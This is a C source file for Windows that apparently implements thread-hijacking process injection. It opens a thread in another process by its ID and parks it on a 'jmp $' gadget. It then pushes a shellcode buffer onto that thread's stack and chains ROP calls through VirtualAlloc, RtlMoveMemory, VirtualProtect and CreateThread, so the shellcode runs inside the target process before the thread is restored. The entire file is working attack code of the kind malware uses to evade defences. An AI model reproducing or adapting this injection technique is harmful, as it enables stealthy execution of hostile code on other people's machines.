#include <windows.h>
#include <stdio.h>
#include "helpers.h"
#define gpa(x, y) ((unsigned int)GetProcAddress(GetModuleHandleA(x), y))
int main(int argc, char** argv){
    DWORD tid = atoi(argv[1]); //get thread id using args
    HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    
    //find gadgets, using kernelbase.dll
    pshc=findr("\x50\xFF\xD6", 3); //push eax; call esi
    jmps=findr("\xEB\xFE", 2); //jmp $
    ret=findr("\xC3", 1); //ret
    
    //set eip to a `jmp $`, blocks when kernel exit
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    unsigned int oeip = ctx.Eip;
    ctx.Eip = jmps;
    SetThreadContext(thd, &ctx);
    ctx.Eip = oeip;
    ResumeThread(thd);
    printf("Primed thread, waiting for kernel exit...\n");
    
    //wait for thread's user time to increase, signifying kernel exit
    waitunblock(thd);
    printf("Process exited kernel, ready for injection\n");
    
    DWORD t0 = GetTickCount();
    
    //push a junk val to stack, this is quite useless but it simplifies the code
    opening(thd);
    
    //inject the buffer
    int j;
    for(j=sizeof(buf);j>4;j-=4){
        unsigned int num = 0;
        memcpy(&num, buf+j-4, 4);
        push(num);
    }
    unsigned int newbuf = sizeof(buf);
    unsigned int nesp;
    j-=4;
    if(j>-4){
        unsigned int num = 0x90909090;
        memcpy(((unsigned char*)&num)-j, buf, 4+j);
        nesp = push(num);
        newbuf=4*((newbuf+4)/4);
    }
    printf("Pushed code to stack, stack head at 0x%x\n", nesp);
    
    //push virtualalloc, alloc 1 page in RW
    push(PAGE_READWRITE);
    push(MEM_COMMIT);
    push(0x1000);
    push(0);
    push(jmps);
    push(gpa("kernelbase.dll", "VirtualAlloc"));
    
    //execute
    slay(thd);
    
    waitunblock(thd);
    unsigned int addr = getretpush(0, thd);
    printf("VirtualAlloc'd memory at 0x%x\n", addr);
    
    //prepare RtlMoveMemory -> VirtualProtect -> CreateThread rop sled
    push(0);
    push(0);
    push(addr);
    push(0);
    push(0);
    push(jmps);
    push(gpa("kernel32.dll", "CreateThread"));
    
    push(nesp); //just use unused portion of stack for mandatory LPVOID
    push(PAGE_EXECUTE_READ);
    push(0x1000);
    push(addr);
    push(ret);
    push(gpa("kernelbase.dll", "VirtualProtect"));
    
    push(newbuf);
    push(nesp);
    push(addr);
    push(ret);
    push(gpa("ntdll.dll", "RtlMoveMemory"));
    slay(thd);
    printf("Waiting for shellcode thread creation...\n");
    waitunblock(thd);
    printf("Execution completed! Restoring original thread...\n");
    SuspendThread(thd);
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    printf("Full injection sequence done. Time elapsed: %dms\n", GetTickCount()-t0);
}